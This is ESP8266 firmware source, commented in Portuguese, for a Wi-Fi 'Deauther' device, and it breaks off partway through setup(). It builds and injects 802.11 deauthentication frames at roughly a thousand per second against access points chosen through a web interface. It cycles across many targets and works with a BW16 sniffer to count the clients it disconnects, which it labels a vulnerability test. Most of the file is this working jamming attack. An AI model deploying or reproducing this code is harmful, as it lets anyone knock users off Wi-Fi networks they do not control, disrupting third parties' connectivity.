#include <ESP8266WiFi.h>
#include <ArduinoJson.h>

// O SDK da Espressif permite acesso direto ao hardware (raw frames, canais)
// Precisa de extern "C" pois é header em C puro.
extern "C" {
#include "user_interface.h"
}

// Bibliotecas para o Servidor Web Assíncrono (não bloqueia o loop)
#include <ESPAsyncWebServer.h>  // Servidor HTTP assíncrono (não trava o loop principal)
#include <ESPAsyncTCP.h>        // TCP assíncrono (dependência do AsyncWebServer)
#include <LittleFS.h>           // Sistema de arquivos (HTML, CSS, logs, wifi.txt)
#include <ESP8266mDNS.h>        // mDNS para responder em deauther.local

// -----------------------------------------------------------------------------
//  Configuração da rede AP (o ESP8266 vai criar o Wi-Fi "Deauther")
// -----------------------------------------------------------------------------
IPAddress local_IP(192, 168, 4, 99);   // IP do ESP8266 dentro do próprio AP
IPAddress gateway(192, 168, 4, 1);
IPAddress subnet(255, 255, 255, 0);

// Servidor HTTP na porta 80 e canal SSE (Server-Sent Events) em /events.
// O SSE empurra logs/eventos em tempo real para a página no navegador
// (sem precisar de polling).
AsyncWebServer  server(80);
AsyncEventSource events("/events");

// -------------------- Controle de teste de vulnerabilidade --------------------
int dispositivosInicial = 0;    // contagem recebida no 1º sniff do BW16
String macsIniciais = "";       // lista CSV de MACs vista no 1º sniff
bool pararBw16 = false;         // flag de cancelamento (consumida pelo BW16)
int quantidadeAlvos = 0;        // quantos alvos foram configurados
bool testando = false;          // flag de ataque LOCAL (deauth) em andamento
int indexAlvoAtual = 0;         // índice do alvo atual no ciclo de ataque
unsigned long lastSwitch = 0;   // timestamp da última troca de alvo
int tempoPorAlvo = 15000;       // 15 s em cada AP antes de trocar de canal
String comandoPendente = "NONE";// próximo comando que o BW16 vai buscar via polling
int alvosPendentes = 0;         // número de alvos que ainda vão ser testados

// Tempos padrão do teste de vulnerabilidade (em segundos)
int tempoSniffInicial = 12;     // 1ª janela de sniff
int tempoSniffDurante = 6;      // 2ª janela de sniff (já durante o deauth)
int intervaloTempo    = 10;     // intervalo entre as duas janelas

// Credenciais de Wi-Fi em modo STA (carregadas de /wifi.txt)
String nomeRede  = "";
String senhaRede = "";

// -------------------- Controle do estado do BW16 --------------------
bool bw16Ocupado = false;                          // BW16 está executando comando?
unsigned long bw16OcupadoDesde = 0;                // quando começou
unsigned long bw16DuracaoEstimada = 0;             // quanto tempo deve durar
unsigned long ultimoPollBW16 = 0;                  // último poll recebido
const unsigned long TIMEOUT_BW16_MS = 5000;        // > 5 s sem poll = offline

// Constantes do sistema de logs
#define LOG_FILE        "/logs.txt"
#define LOG_BUFFER_MAX  200        // nº máximo de linhas em RAM
#define LOG_FLUSH_EVERY 4          // grava no FS a cada 4 linhas
#define LOG_MAX_SIZE    512000     // se arquivo passar disso, apaga (evita encher flash)

String logBuffer[LOG_BUFFER_MAX];  // buffer circular em RAM
int logHead = 0;                   // próxima posição de escrita
int logCount = 0;                  // quantas linhas válidas existem
int logSinceFlush = 0;             // contador desde última gravação em FS

// -------------------- Sincronização de horário com o navegador --------------------
// O navegador envia {h,m,s}; guardamos a base e o millis() daquele instante.
// Depois calculamos a hora atual somando o decorrido.
int baseH = 0, baseM = 0, baseS = 0;
unsigned long baseMillis = 0;
bool timeSynced = false;

// -------------------- Lista de alvos --------------------
#define MAX_ALVOS 50
struct RedeAlvo {
  String  bssid;   // "AA:BB:CC:DD:EE:FF"
  uint8_t canal;   // canal Wi-Fi
};

// Gera "[HH:MM:SS]" usando a base sincronizada + millis() decorrido
String timestampNow() {
  if (!timeSynced) return "[--:--:--]";

  unsigned long elapsed = (millis() - baseMillis) / 1000UL;   // segundos desde sync
  long totalS = baseH * 3600L + baseM * 60L + baseS + (long)elapsed;
  totalS %= 86400L;                                           // evita passar de 23:59:59

  int h = totalS / 3600;
  int m = (totalS % 3600) / 60;
  int s = totalS % 60;

  char buf[16];
  snprintf(buf, sizeof(buf), "[%02d:%02d:%02d]", h, m, s);
  return String(buf);
}

// Adiciona linha ao buffer circular e (em lotes) ao arquivo
void logAdd(const String& linha) {
  logBuffer[logHead] = linha;
  logHead = (logHead + 1) % LOG_BUFFER_MAX;      // avança ponteiro circular
  if (logCount < LOG_BUFFER_MAX) logCount++;
  logSinceFlush++;

  Serial.println(linha);

  // Grava em lote na flash para poupar ciclos de escrita (desgaste)
  if (logSinceFlush >= LOG_FLUSH_EVERY) flushLogs();
}

// Grava o buffer circular no arquivo /logs.txt em ordem cronológica
void flushLogs() {
  if (logSinceFlush == 0) return;
  logSinceFlush = 0;

  // Se o arquivo ficar grande demais, apaga (rotação simples, sem backup)
  File f = LittleFS.open(LOG_FILE, "r");
  if (f && f.size() > LOG_MAX_SIZE) {
    f.close();
    LittleFS.remove(LOG_FILE);
  } else if (f) {
    f.close();
  }

  f = LittleFS.open(LOG_FILE, "a");   // append
  if (!f) return;

  // Escreve cronologicamente do mais antigo ao mais recente
  for (int i = 0; i < logCount; i++) {
    int idx = (logHead - logCount + i + LOG_BUFFER_MAX) % LOG_BUFFER_MAX;
    f.println(logBuffer[idx]);
  }
  f.close();
}

extern "C" {
#include "c_types.h"
#include "user_interface.h"
  // Função low-level da SDK Espressif que permite injetar qualquer frame 802.11.
  // Retorna 0 em sucesso. Útil para deauth (frame de management type 0, subtype 12).
  int wifi_send_pkt_freedom(uint8_t *buf, int len, bool sys_seq);
}

// Modelo padrão de um frame Deauth (26 bytes):
//   [0-1]  Frame Control  = C0 00  (type=0/mgmt, subtype=12/deauth)
//   [2-3]  Duration
//   [4-9]  Addr1 = Destino (Broadcast ou MAC do cliente)
//   [10-15] Addr2 = Origem  (BSSID do AP)
//   [16-21] Addr3 = BSSID
//   [22-23] Sequence Control
//   [24-25] Reason Code

// Pacote padrão de Deauth (26 bytes)
uint8_t deauthPacket[26] = {
  0xC0, 0x00,                          // Frame Control: Deauth
  0x00, 0x00,                          // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destino (Broadcast padrão)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Origem (BSSID / MAC do AP)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
  0x00, 0x00,                          // Sequence Number
  0x01, 0x00                           // Reason Code: Unspecified
};

// Ajusta o buffer global de deauth para o alvo atual
void buildDeauthPacket(uint8_t *targetMac, uint8_t *apMac, uint16_t reason = 1) {
  
  memcpy(&deauthPacket[4], targetMac, 6);   // Destino (MAC do cliente ou Broadcast FF:FF:FF:FF:FF:FF)
  memcpy(&deauthPacket[10], apMac, 6);      // Origem (MAC do Roteador / AP)
  memcpy(&deauthPacket[16], apMac, 6);      // BSSID (Mesmo MAC do Roteador)
  deauthPacket[24] = 0x01;                  // Motivo
  deauthPacket[25] = 0x00;
}

// Converte "AA:BB:CC:DD:EE:FF" em bytes
void macStringToBytes(const char *str, uint8_t *bytes) {
  if (str == nullptr || strlen(str) != 17) {
    Serial.println("MAC string inválida, abortando");
    memset(bytes, 0, 6);
    return;
  }
  unsigned int mac[6];
  sscanf(str, "%x:%x:%x:%x:%x:%x", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
  for (int i = 0; i < 6; i++) {
    bytes[i] = (uint8_t)mac[i];
  }
}

// -------------------- Loop de envio não-bloqueante --------------------
bool isAttacking = false;
uint16_t seqNum = 0;         // contador de sequência do frame 802.11
unsigned long lastSend = 0;
const int sendInterval = 1;  // 1ms = ~1000 pacotes/seg

// Executado constantemente no loop. Envia um pacote a cada 1ms
void loopAttack() {
  if (!isAttacking) return;
  
  unsigned long now = millis();

  if (now - lastSend >= sendInterval) {
    lastSend = now;

    // Preenche o Sequence Control (4 bits em [22] e 8 bits em [23])
    deauthPacket[22] = (seqNum & 0x0F) << 4;
    deauthPacket[23] = (seqNum & 0xFF0) >> 4;
    seqNum = (seqNum + 1) % 0xFFF;

    // Dispara o pacote pelo ar
    int result = wifi_send_pkt_freedom(deauthPacket, 26, 0);

    // Checando se o envio do pacote teve sucesso
    /*Serial.print("Resultado envio: ");
    Serial.println(result);
    if (result != 0) {
      Serial.printf("Erro PHY SDK: %d | Canal atual: %d\n", result, wifi_get_channel());
    } else {
      Serial.println("Pacote enviado com SUCESSO (0)");
    }*/
  }
}

void startAttack() { isAttacking = true; } // Dispara a cada 100ms (10 pacotes por segundo) sem bloquear a CPU
void stopAttack() { isAttacking = false; }

RedeAlvo listaAlvos[MAX_ALVOS];

// -------------------- Utilidades de canal / BW16 --------------------

bool isBW16Conectado() {
  return (millis() - ultimoPollBW16) < TIMEOUT_BW16_MS;
}

void mudarCanal(uint8_t novoCanal) {
  if (novoCanal >= 1 && novoCanal <= 13) {
    wifi_set_channel(novoCanal);  // troca o canal do rádio (necessário p/ deauth no AP certo)
    Serial.print("Canal alterado para: ");
    Serial.println(novoCanal);
    delay(10);                    // pequena espera de estabilização
  }
}

// Envia ao navegador (SSE, sem timestamp — ele põe), e grava com timestamp
// no buffer e no Serial.

void webLog(const String& msg) {
  // 1. Para o console ao vivo: envia SEM timestamp
  events.send(msg.c_str(), "log", millis());

  // 2. Para o arquivo (buffer + LittleFS): COM timestamp
  String linha = timestampNow() + " " + msg;
  logAdd(linha);

  // 3. Para o Serial: com timestamp
  //Serial.println(linha);
}

// Converte authmode do SDK em string legível
String encryptionTypeStr(uint8_t authmode) {
  switch (authmode) {
    case ENC_TYPE_NONE: return "Aberta";
    case ENC_TYPE_TKIP: return "WPA";
    case ENC_TYPE_CCMP: return "WPA2";
    case ENC_TYPE_WEP: return "WEP";
    case ENC_TYPE_AUTO: return "Auto";
    default: return "Desconhecido";
  }
}

unsigned int lastScan = 0;
bool scanEmAndamento = false;

// Dispara um scan assíncrono (não trava o servidor web,
// evitando o "Connect to server failed" no BW16)
void iniciarScanAP() {
  // Só escaneia se não estiver atacando ou com o BW16 ocupado
  if (testando || isAttacking || events.count() == 0 || scanEmAndamento) return;
  if (comandoPendente != "NONE") return;  // não inicia scan se há comando pendente
  if (alvosPendentes > 0) return; 
  if (bw16Ocupado) {
    // Fallback: libera por timeout se o BW16 não mandou mais nada
    if (millis() - bw16OcupadoDesde > bw16DuracaoEstimada) {
      bw16Ocupado = false;
    } else {
      return;  // BW16 ainda está ocupado
    }
  }
  
  Serial.println("Iniciando scan assíncrono...");
  WiFi.mode(WIFI_AP_STA);         // AP_STA para não derrubar o AP ao scanear
  WiFi.scanNetworks(true, true);  // (async=true, show_hidden=true)
  scanEmAndamento = true;
}

// Verifica se o scan terminou e envia cada rede via SSE (evento "scan")
void processarScanAP() {
  if (!scanEmAndamento) return;

  int n = WiFi.scanComplete();
  if (n == WIFI_SCAN_RUNNING) return; // Ainda rodando
  if (n == WIFI_SCAN_FAILED) {
    Serial.println("Scan falhou");
    scanEmAndamento = false;
    return;
  }

  Serial.printf("Scan concluído. Redes encontradas: %d\n", n);

  // Envia as redes encontradas via SSE (evento 'scan')
  for (int i = 0; i < n; i++) {
    String encType = encryptionTypeStr(WiFi.encryptionType(i));
    String json = "{";
    json += "\"TYPE\":\"SCAN\",";
    json += "\"ssid\":\"" + WiFi.SSID(i) + "\",";
    json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
    json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
    json += "\"chan\":" + String(WiFi.channel(i)) + ",";
    json += "\"enc\":\"" + encType + "\"";
    json += "}";
    events.send(json.c_str(), "scan", millis());
    delay(5);         // respira entre eventos (evita estourar buffers TCP)
    yield();
  }
  WiFi.scanDelete();  // libera memória do scan
  scanEmAndamento = false;
}

// Atualiza o buffer deauth para o alvo atual (e, se sniffing, monta comando)
void atualizarPacoteParaAlvoAtual() {
  if (quantidadeAlvos == 0) return;
  uint8_t apMac[6];
  uint8_t broadcastMac[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

  // Converte a String de BSSID do alvo atual para array de bytes
  macStringToBytes(listaAlvos[indexAlvoAtual].bssid.c_str(), apMac);

  // Preenche o buffer global de deauth
  buildDeauthPacket(broadcastMac, apMac, 1);
}

void setupWebAPIs() {

  // ---- Status do próprio ESP ----
  server.on("/status-esp", HTTP_GET, [](AsyncWebServerRequest *request) {
    // O simples fato de responder indica que o servidor está no ar
    request->send(200, "application/json", "{\"online\":true}");
  });

  // ---- Status do BW16 (baseado em heartbeat via polling) ----
  server.on("/status-bw16", HTTP_GET, [](AsyncWebServerRequest *request) {
    String json = "{\"conectado\":" + String(isBW16Conectado() ? "true" : "false") + "}";
    request->send(200, "application/json", json);
  });

  // 1. Sincronização de horário: O JS envia a hora do PC/Celular
  server.on(
    "/api/time-sync", HTTP_POST,
    [](AsyncWebServerRequest *request) {},
    NULL,
    [](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
      String body = String((char *)data).substring(0, len);
      DynamicJsonDocument doc(128);
      if (deserializeJson(doc, body)) {
        request->send(400, "text/plain", "JSON inválido");
        return;
      }

      baseH = doc["h"] | 0;
      baseM = doc["m"] | 0;
      baseS = doc["s"] | 0;
      baseMillis = millis();
      timeSynced = true;

      Serial.printf("Time sync do navegador: %02d:%02d:%02d\n", baseH, baseM, baseS);
      request->send(200, "text/plain", "OK");
  });

  // 2. Salvar Configurações (Wi-Fi e Tempos)
  server.on(
    "/api/configurar-tempos", HTTP_POST,
    [](AsyncWebServerRequest *request) {
      request->send(200, "text/plain", "OK");
    },
    NULL,
    [](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
      String body = String((char *)data).substring(0, len);
      DynamicJsonDocument doc(256);
      deserializeJson(doc, body);

      // Atualiza os tempos na RAM
      tempoSniffInicial = doc["tempoInicial"] | 12;
      tempoSniffDurante = doc["tempoDurante"] | 6;
      intervaloTempo = doc["tempoAtaque"] | 10;
      int timeout = doc["timeoutDispositivo"] | 2;

      nomeRede = doc["ssid"] | "";
      senhaRede = doc["senha"] | "";

      if (tempoSniffInicial < 1) tempoSniffInicial = 12;
      if (tempoSniffDurante < 1) tempoSniffDurante = 6;
      if (intervaloTempo < 1) intervaloTempo = 10;

      // Salva o SSID e a Senha no arquivo /wifi.txt
      File f = LittleFS.open("/wifi.txt", "w");
      f.println(nomeRede);
      f.println(senhaRede);
      f.close();

      Serial.printf("Configurações de tempo recebidas: inicial=%d, durante=%d, intervalo=%d, timeout=%d, ssid=%s\n",
                    tempoSniffInicial, tempoSniffDurante, intervaloTempo, timeout, nomeRede.c_str());
      
      // Tenta conectar à nova rede
      if (nomeRede.length() > 0) {
        Serial.println("Tentando conectar à rede: " + nomeRede);
        
        // Muda para AP+STA para não perder a conexão com o celular
        WiFi.mode(WIFI_AP_STA);
        
        // Tenta conectar (usando SSID e senha)
        WiFi.begin(nomeRede.c_str(), senhaRede.c_str());      
     }

    });

  // 3. Configurar Alvos + iniciar ação (atacar/sniff/vuln)
  server.on(
    "/configurar-alvos", HTTP_POST,
    [](AsyncWebServerRequest *request) {},
    NULL,
    [](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
      static String body;

      // Início da requisição
      if (index == 0) {
        body = "";
      }

      // Junta os pedaços do JSON
      for (size_t i = 0; i < len; i++) {
        body += (char)data[i];
      }

      // Só processa quando terminar de receber tudo
      if (index + len == total) {

        Serial.println("JSON recebido:");
        Serial.println(body);

        DynamicJsonDocument doc(2048);
        DeserializationError erro = deserializeJson(doc, body);

        if (erro) {
          Serial.printf("Erro no JSON: %s\n", erro.c_str());
          request->send(400, "text/plain", "JSON Invalido");
          return;
        }

        if (!(doc)["alvos"].is<JsonArray>()) {
          request->send(400, "text/plain", "Formato inválido: 'alvos' deve ser array");
          return;
        }

        quantidadeAlvos = 0;
        JsonArray alvosJson = (doc)["alvos"];

        for (JsonVariant alvo : alvosJson) {

          if (quantidadeAlvos >= MAX_ALVOS) break;

          if (alvo.is<JsonObject>()) {
            listaAlvos[quantidadeAlvos].bssid = alvo["bssid"].as<String>();
            listaAlvos[quantidadeAlvos].canal = alvo["chan"].as<uint8_t>();
          } else if (alvo.is<String>()) {
            listaAlvos[quantidadeAlvos].bssid = alvo.as<String>();
            listaAlvos[quantidadeAlvos].canal = 1;
          } else {
            continue;
          }

          Serial.printf("Alvo %d -> %s | Canal: %d\n",
                        quantidadeAlvos,
                        listaAlvos[quantidadeAlvos].bssid.c_str(),
                        listaAlvos[quantidadeAlvos].canal);

          quantidadeAlvos++;
        }

        if (quantidadeAlvos > 0) {
          String comando = doc["comando"] | "atacar";  // padrão é atacar

          if (comando == "sniff") {
            // Cria um comando de Sniff para o BW16
            stopAttack();
            String cmd = "SNIFF_ONLY|" + String(tempoSniffInicial) + "|";
            for (int i = 0; i < quantidadeAlvos; i++) {
              if (i > 0) cmd += ";";
              cmd += listaAlvos[i].bssid + "," + String(listaAlvos[i].canal);
            }
            comandoPendente = cmd;
            webLog("Comando de sniffing preparado: " + cmd);
          }
          else if (comando == "vuln") {
            // Cria um comando de Vulnerabilidade para o BW16
            stopAttack();
            String cmd = "VULN_TEST|";
            for (int i = 0; i < quantidadeAlvos; i++) {
              if (i > 0) cmd += ";";
              cmd += listaAlvos[i].bssid + "," + String(listaAlvos[i].canal) + "," +
                    String(tempoSniffInicial) + "," + String(tempoSniffDurante) + "," + String(intervaloTempo);
            }
            comandoPendente = cmd;
            webLog("Comando de teste de vulnerabilidade preparado: " + cmd);
          }
          else { // "atacar" — ataque LOCAL no ESP8266
            testando = true;
            indexAlvoAtual = 0;
            lastSwitch = millis();

            mudarCanal(listaAlvos[0].canal);
            atualizarPacoteParaAlvoAtual();
            startAttack();

            webLog("Ataque LOCAL iniciado com " + String(quantidadeAlvos) + " alvo(s)");
          }

          request->send(200, "text/plain", "Alvos recebidos.");
        } else {
          testando = false;
          request->send(400, "text/plain", "Nenhum alvo válido");
        }
      }
    });

  // 4. Polling do BW16 (O BW16 pergunta a cada 1s se tem comando)
  // Handler: BW16 chama isso via polling (GET /api/obter-comando)
  server.on("/api/obter-comando", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(200, "text/plain", comandoPendente);
    ultimoPollBW16 = millis();

    // Estima a duração para "bloquear" novas ações enquanto o BW16 trabalha
    if (comandoPendente != "NONE") {
      webLog("Comando entregue ao BW16: " + comandoPendente);

      // Conta quantos alvos existem no comando (separador ';')
      auto contarAlvos = [](const String& cmd, char sep) -> int {
        int n = 1;
        for (size_t i = 0; i < cmd.length(); i++) if (cmd[i] == sep) n++;
        return n;
      };

      if (comandoPendente.startsWith("SNIFF_ONLY")) {
        int p1 = comandoPendente.indexOf('|');
        int p2 = comandoPendente.indexOf('|', p1 + 1);
        int tempo = comandoPendente.substring(p1 + 1, p2).toInt();

        String lista = comandoPendente.substring(p2 + 1);
        alvosPendentes = contarAlvos(lista, ';');
        bw16DuracaoEstimada = (tempo + 5) * 1000UL;  // +5s de margem
      } 
      
      else if (comandoPendente.startsWith("VULN_TEST")) {
        // VULN_TEST tem 2 sniffings + intervalo
        String lista = comandoPendente.substring(comandoPendente.indexOf('|') + 1);
        alvosPendentes = contarAlvos(lista, ';');

        bw16DuracaoEstimada = (tempoSniffInicial + tempoSniffDurante + intervaloTempo + 10) * 1000UL;
      } else {
        bw16DuracaoEstimada = 15000;  // padrão
      }

      bw16Ocupado = true;
      bw16OcupadoDesde = millis();
      comandoPendente = "NONE";       // consumiu o comando
    }
  });

  // ---- Recebe o 1º relatório (sniff inicial) e inicia o deauth ----
  server.on(
    "/api/resultado-sniff-inicial", HTTP_POST,
    [](AsyncWebServerRequest *request) {
      request->send(200, "text/plain", "OK");
    },
    NULL,
    [](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
      String body = String((char *)data).substring(0, len);
      DynamicJsonDocument doc(256);
      deserializeJson(doc, body);

      String bssid = doc["bssid"];
      uint8_t canal = doc["canal"];
      int dispositivos = doc["dispositivos"];

      Serial.println("1. Recebido sniff inicial");
      Serial.print("BSSID: ");
      Serial.println(bssid);
      Serial.print("Canal: ");
      Serial.println(canal);

      macsIniciais = doc["macs"].as<String>();
      Serial.println("MACs iniciais recebidos: " + macsIniciais);

      // Configurar canal
      mudarCanal(canal);
      Serial.println("2. Canal alterado");

      // Converter BSSID para bytes
      uint8_t apMac[6];
      macStringToBytes(bssid.c_str(), apMac);
      Serial.println("3. MAC convertido");

      // Montar pacote deauth
      uint8_t broadcastMac[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
      buildDeauthPacket(broadcastMac, apMac, 1);
      Serial.println("4. Pacote deauth montado");

      // Iniciar ataque
      dispositivosInicial = dispositivos;
      startAttack();
      Serial.println("5. Ataque iniciado");

      webLog("Ataque iniciado para teste de vulnerabilidade em " + bssid);
      request->send(200, "text/plain", "OK");
    });

  // ---- Recebe o 2º relatório e calcula vulnerabilidade ----
  server.on(
    "/api/resultado-sniff-durante", HTTP_POST,
    [](AsyncWebServerRequest *request) {
      request->send(200, "text/plain", "OK");
    },
    NULL,
    [](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
      String body = String((char *)data).substring(0, len);
      DynamicJsonDocument doc(256);
      deserializeJson(doc, body);

      int dispositivosDurante = doc["dispositivos"];
      String bssid = doc["bssid"];

      Serial.printf("Sniff durante: %s com %d dispositivos\n", bssid.c_str(), dispositivosDurante);

      String macsDurante = doc["macs"].as<String>();
      Serial.println("MACs durante recebidos: " + macsDurante);

      // Diferença de listas: MACs que estavam no início e sumiram
      String desconectados = compararListas(macsIniciais, macsDurante);

      if (desconectados.length() > 0) {
        webLog("Dispositivos desconectados: " + desconectados);
      } else {
        webLog("Nenhum dispositivo desconectado.");
      }

      stopAttack();
      alvosPendentes--;
      if (alvosPendentes <= 0) {
        alvosPendentes = 0;
        bw16Ocupado = false;      // só agora o ESP pode voltar a escanear
      }

      // Veredito: se houve queda, a rede é vulnerável ao deauth
      if (desconectados.length() > 0) {
        String msg = "Rede " + bssid + " VULNERÁVEL! Desconectados: " + desconectados;
        msg += " | Contagem inicial: " + String(dispositivosInicial) + " → durante: " + String(dispositivosDurante);
        webLog(msg);
      } else {
        webLog("Rede " + bssid + " não apresentou queda de dispositivos.");
      }
    });

  // ---- Relatório simples de sniff (SNIFF_ONLY) ----
  server.on(
    "/api/relatorio-sniff", HTTP_POST,
    [](AsyncWebServerRequest *request) {
      request->send(200, "text/plain", "OK");
    },
    NULL,
    [](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
      String body = String((char *)data).substring(0, len);
      webLog("Resultado do sniff: " + body);

      // Se quiser tratar o JSON de verdade (ex: guardar em array, atualizar dashboard)
      // use ArduinoJson aqui pra parsear 'body' em vez de só logar o texto cru.
      alvosPendentes--;
      if (alvosPendentes <= 0) {
        alvosPendentes = 0;
        bw16Ocupado = false;
      }
    });

  // ---- Botão "Parar" ----
  server.on("/parar", HTTP_POST, [](AsyncWebServerRequest *request) {
    testando = false;
    quantidadeAlvos = 0;
    indexAlvoAtual = 0;
    lastSwitch = 0;
    alvosPendentes = 0;
    pararBw16 = true; // o BW16 vai ler isso em /api/status-parada
    bw16Ocupado = false;
    stopAttack();
    Serial.println("Parado pelo usuário");
    request->send(200, "text/plain", "Parado");
  });

   // ---- BW16 consulta se deve parar (cancelamento) ----
  server.on("/api/status-parada", HTTP_GET, [](AsyncWebServerRequest *request) {
    String json = "{\"parar\":" + String(pararBw16 ? "true" : "false") + "}";
    request->send(200, "application/json", json);
  });

  // ---- Metadados do arquivo de logs ----
  server.on("/api/logs/info", HTTP_GET, [](AsyncWebServerRequest *request){
    bool existe = false;
    size_t bytes = 0;

    if(LittleFS.exists(LOG_FILE)){
      File f = LittleFS.open(LOG_FILE, "r");   // guarda o File
      if(f){
        bytes  = f.size();                    // size() do File, não do path
        existe = (bytes > 0);
        f.close();   
      }
    }

    String json = "{\"exists\":" + String(existe ? "true" : "false") +
                  ",\"bytes\":"  + String((unsigned long)bytes) + "}";
    request->send(200, "application/json", json);
  });
  
  // ---- Retorna o buffer RAM como texto ----
  server.on("/api/logs", HTTP_GET, [](AsyncWebServerRequest *request){
    // Envia todo o buffer de logs para a página logs.html
    String out;
    out.reserve(logCount * 80);
    for (int i = 0; i < logCount; i++) {
      int idx = (logHead - logCount + i + LOG_BUFFER_MAX) % LOG_BUFFER_MAX;
      out += logBuffer[idx];
      out += "\n";
    }
    request->send(200, "text/plain", out);
  });

  // ---- Download do arquivo persistente ----
  server.on("/download/logs.txt", HTTP_GET, [](AsyncWebServerRequest *request){
    flushLogs();  // garante que o que está em RAM foi para o disco
    if (!LittleFS.exists(LOG_FILE)) {
      request->send(404, "text/plain", "Sem logs");
      return;
    }
    request->send(LittleFS, LOG_FILE, "text/plain", true);  // true = attachment
  });

  // ---- Limpar logs ----
  server.on("/api/logs/clear", HTTP_POST, [](AsyncWebServerRequest *request){
    logHead = 0;
    logCount = 0;
    logSinceFlush = 0;
    if (LittleFS.exists(LOG_FILE)) LittleFS.remove(LOG_FILE);
    request->send(200, "text/plain", "Logs apagados");
  });

  // ---- Servir arquivos estáticos (HTML/CSS/JS) ----
  server.serveStatic("/", LittleFS, "/").setDefaultFile("index.html");

  server.onNotFound([](AsyncWebServerRequest *request) {
    request->send(404, "text/plain", "Nao encontrado: " + request->url());
  });
}

// Mostra o pacote deauth atual no Serial (debug)
void printPacket(uint8_t *packet, int len) {
  Serial.print("Pacote deauth: ");

  for (int i = 0; i < len; i++) {
    if (packet[i] < 0x10) Serial.print("0");  // formatação
    Serial.print(packet[i], HEX);
    Serial.print(" ");
  }

  Serial.println();
}

// Enquanto "testando" = true, cicla entre os alvos a cada tempoPorAlvo (15 s)
void TestandoRedes() {
  if (quantidadeAlvos == 0) return;

  // Garante que o ataque está ativo no Ticker
  if (!isAttacking) {
    atualizarPacoteParaAlvoAtual();
    startAttack();
  }

  // A cada 15 segundos (tempoPorAlvo), troca o canal e o AP
  if (millis() - lastSwitch >= tempoPorAlvo) {
    lastSwitch = millis();
    indexAlvoAtual = (indexAlvoAtual + 1) % quantidadeAlvos;

    // Muda o hardware de rádio para o canal do novo alvo
    mudarCanal(listaAlvos[indexAlvoAtual].canal);

    // Atualiza o pacote com o novo MAC
    atualizarPacoteParaAlvoAtual();
    printPacket(deauthPacket, 26);

    webLog("Trocando para o alvo " + String(indexAlvoAtual) + ": " + listaAlvos[indexAlvoAtual].bssid);
  }
}

// Recebe "A,B,C" e "A,B" -> retorna "C" (o que estava em lista1 e sumiu)
String compararListas(String lista1, String lista2) {
  // 1. Remove espaços extras ou quebras de linha (\r, \n) no início/fim das strings
  lista1.trim();
  lista2.trim();

  // Se a primeira lista estiver vazia, não há o que comparar
  if (lista1.length() == 0) return "";

  // 2. Divide a lista1 em um array de MACs individuais
  // Tokeniza lista1 em até 50 MACs
  String macs1[50];
  int count1 = 0;
  int start = 0;
  while (count1 < 50) {
    int comma = lista1.indexOf(',', start);
    if (comma == -1) { // Se não achou mais vírgula, pega o resto da string
      macs1[count1++] = lista1.substring(start);
      break;
    } else { // Se achou vírgula, pega o pedaço até a vírgula
      macs1[count1++] = lista1.substring(start, comma);
      start = comma + 1;
    }
  }

  // 3. Compara cada MAC da lista1 com a lista2
  // Verifica quais MACs da lista1 NÃO aparecem na lista2
  String resultado = "";
  for (int i = 0; i < count1; i++) {
    // Se o MAC da lista1 NÃO for encontrado dentro da string lista2
    if (lista2.indexOf(macs1[i]) == -1) {  // não encontrou
      if (resultado.length() > 0) resultado += ", ";
      resultado += macs1[i];  // Adiciona à lista de "desconectados"
    }
  }
  return resultado;
}

// Tenta conectar à rede salva em /wifi.txt (STA), sem derrubar o AP
void conectarWiFi()
{
  if (LittleFS.exists("/wifi.txt")) { // Verifica se o arquivo wifi.txt existe
    File f = LittleFS.open("/wifi.txt", "r"); // Abre o arquivo wifi.txt
    if (f) {
      String ssidSalvo = f.readStringUntil('\n'); // Salva o SSID e a senha em variáveis locais
      String senhaSalva = f.readStringUntil('\n');
      f.close();
      
      // LIMPA OS CARACTERES INVISÍVEIS \r, espaços, etc (senão "minharede\r" não conecta)
      ssidSalvo.trim();
      senhaSalva.trim();

      if (ssidSalvo.length() > 0) {
        Serial.println("Tentando conectar à rede salva: [" + ssidSalvo + "]");
        WiFi.begin(ssidSalvo.c_str(), senhaSalva.c_str()); // Tenta conectar à rede

        // Timeout de 10 tentativas × 500 ms = ~5 s
        int tentativas = 0;
        while (WiFi.status() != WL_CONNECTED && tentativas < 10) {
          delay(500);
          Serial.print(".");
          tentativas++;
        }
        
        if (WiFi.status() == WL_CONNECTED) { // Verifica se o ESP está conectado à rede
          Serial.println("\nConectado à rede com sucesso!");
          Serial.print("IP STA: ");
          Serial.println(WiFi.localIP()); // Imprime o endereço IP ao se conectar à rede
        } else {
          Serial.println("\nFalha ao conectar. O ESP ficará apenas no modo AP.");
        }
      }
    }
  }
}

void setup() {
  Serial.begin(115200);
  Serial.println();

  // Monta o filesystem (contém HTML/CSS/JS, /wifi.txt, /logs.txt)
  if (!LittleFS.begin()) {
    Serial.println("Erro ao montar o LittleFS");
    return;
  }

  conectarWiFi();                                 // tenta STA (se houver rede salva)

  // Configura o AP (a rede "Deauther" que o usuário acessa)
  WiFi.softAPConfig(local_IP, gateway, subnet);  
  WiFi.softAP("Deauther", "12345678", 11, 0, 8);  // ssid, senha, canal 11, hidden=0, max=8

  Serial.print("IP do AP: ");
  Serial.println(WiFi.softAPIP()); // Imprime o endereço IP do ESP dentro do Access Point criado por ele
  Serial.println("MAC do AP: ");
  Serial.println(WiFi.softAPmacAddress()); //Imprime o endereço MAC do ESP dentro do Access Point criado por ele

  // Configura eventos de conexão no EventSource (SSE) para enviar logs
  // e os resultados para o servidor web.
  // SSE: envia um "CONNECTED" a cada novo cliente conectado ao /events
